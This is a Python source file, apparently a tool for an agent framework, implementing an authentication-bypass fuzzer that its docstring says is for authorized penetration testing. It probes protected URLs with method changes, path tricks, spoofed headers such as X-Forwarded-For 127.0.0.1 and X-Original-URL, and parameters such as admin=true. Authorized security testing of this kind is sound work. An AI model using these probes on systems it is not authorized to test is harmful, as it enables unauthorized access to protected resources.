# src/mcp/executors/AuthBypassFuzzer.py
"""
鉴权绕过 Fuzzer（授权渗透测试专用）

依赖：httpx（pip install httpx）

测试覆盖：
  1. HTTP 方法变换   — GET/POST/HEAD/PUT/PATCH/DELETE/OPTIONS
  2. 路径变种        — 双斜杠 / 点斜杠 / 大写 / 尾斜杠 / 分号 / URL 编码
  3. 请求头注入      — X-Forwarded-For / X-Original-URL / X-Real-IP 等 11 种
  4. 参数注入        — debug / admin / role / auth / access
"""

import time
from typing import Optional
from urllib.parse import urlparse

import structlog

logger = structlog.get_logger(__name__)

try:
    import httpx
    _HTTPX_AVAILABLE = True
except ImportError:
    _HTTPX_AVAILABLE = False


class AuthBypassFuzzer:
    """鉴权绕过 Fuzzer。"""

    def __init__(self, config: dict = None):
        self.config = config or {}

    def _http_client(self, timeout: float = 10.0) -> "httpx.AsyncClient":
        return httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=False,   # 关闭自动跳转，保留原始状态码
            headers={"User-Agent": "Mozilla/5.0 (compatible; DeepAgent/1.0)"},
        )

    async def fuzz(
        self,
        url: str,
        method: str = "GET",
        data: Optional[dict] = None,
        headers: Optional[dict] = None,
    ) -> dict:
        """对目标 URL 执行全套鉴权绕过测试。

        Args:
            url:     目标 URL（通常是返回 401/403 的受保护路径）
            method:  基础 HTTP 方法
            data:    POST 请求体（可选）
            headers: 额外请求头（可选）

        Returns:
            {"success", "url", "baseline",
             "total_tested",
             "bypasses":    疑似成功的测试项列表,
             "all_results": 所有测试项结果,
             "elapsed"}

        bypasses 判定：状态码与基线不同，且为 200/201/301/302
        """
        if not _HTTPX_AVAILABLE:
            return {"success": False, "error": "httpx 未安装: pip install httpx"}

        start        = time.monotonic()
        base_headers = dict(headers or {})
        results: list[dict] = []
        path = urlparse(url).path or "/"

        try:
            async with self._http_client() as client:
                # 基线请求
                baseline      = await client.request(method, url, headers=base_headers, data=data)
                baseline_code = baseline.status_code

                async def _probe(label: str, m: str, u: str, h: dict, d=None):
                    try:
                        r = await client.request(m, u, headers={**base_headers, **h}, data=d)
                        bypass = (r.status_code != baseline_code
                                  and r.status_code in (200, 201, 301, 302))
                        results.append({
                            "label":    label,
                            "method":   m,
                            "url":      u,
                            "headers":  h,
                            "status":   r.status_code,
                            "baseline": baseline_code,
                            "bypass":   bypass,
                        })
                    except Exception as e:
                        results.append({"label": label, "error": str(e)})

                # ── 1. HTTP 方法变换 ──────────────────────────
                for m in ("GET", "POST", "HEAD", "PUT", "PATCH", "DELETE", "OPTIONS"):
                    if m != method:
                        await _probe(f"method:{m}", m, url, {})

                # ── 2. 路径变种 ───────────────────────────────
                for label, variant in {
                    "path:double_slash": url.replace(path, "//" + path.lstrip("/")),
                    "path:dot_slash":    url.replace(path, "/." + path),
                    "path:uppercase":    url.replace(path, path.upper()),
                    "path:trailing":     url.rstrip("/") + "/",
                    "path:semicolon":    url.replace(path, path + ";"),
                    "path:enc_slash":    url.replace(path, path.replace("/", "%2F", 1)),
                }.items():
                    await _probe(label, method, variant, {})

                # ── 3. 请求头注入 ─────────────────────────────
                for label, hdrs in [
                    ("hdr:xff_127",        {"X-Forwarded-For": "127.0.0.1"}),
                    ("hdr:xff_any",        {"X-Forwarded-For": "0.0.0.0"}),
                    ("hdr:x_real_ip",      {"X-Real-IP": "127.0.0.1"}),
                    ("hdr:x_original_url", {"X-Original-URL": path}),
                    ("hdr:x_rewrite_url",  {"X-Rewrite-URL": path}),
                    ("hdr:x_custom_ip",    {"X-Custom-IP-Authorization": "127.0.0.1"}),
                    ("hdr:x_fwd_host",     {"X-Forwarded-Host": "localhost"}),
                    ("hdr:x_host",         {"X-Host": "localhost"}),
                    ("hdr:referer",        {"Referer": "http://localhost/"}),
                    ("hdr:content_len_0",  {"Content-Length": "0"}),
                    ("hdr:accept_json",    {"Accept": "application/json"}),
                ]:
                    await _probe(label, method, url, hdrs)

                # ── 4. 参数注入 ───────────────────────────────
                sep = "&" if "?" in url else "?"
                for label, params in [
                    ("param:debug",  {"debug": "true"}),
                    ("param:admin",  {"admin": "true"}),
                    ("param:role",   {"role": "admin"}),
                    ("param:auth",   {"auth": "bypass"}),
                    ("param:access", {"access": "all"}),
                ]:
                    qs = "&".join(f"{k}={v}" for k, v in params.items())
                    await _probe(label, method, url + sep + qs, {})

            bypasses = [r for r in results if r.get("bypass")]
            logger.info("auth_bypass_done", url=url,
                        total=len(results), bypasses=len(bypasses))
            return {
                "success":      True,
                "url":          url,
                "baseline":     baseline_code,
                "total_tested": len(results),
                "bypasses":     bypasses,
                "all_results":  results,
                "elapsed":      round(time.monotonic() - start, 2),
            }

        except Exception as e:
            return {"success": False, "error": str(e), "url": url}
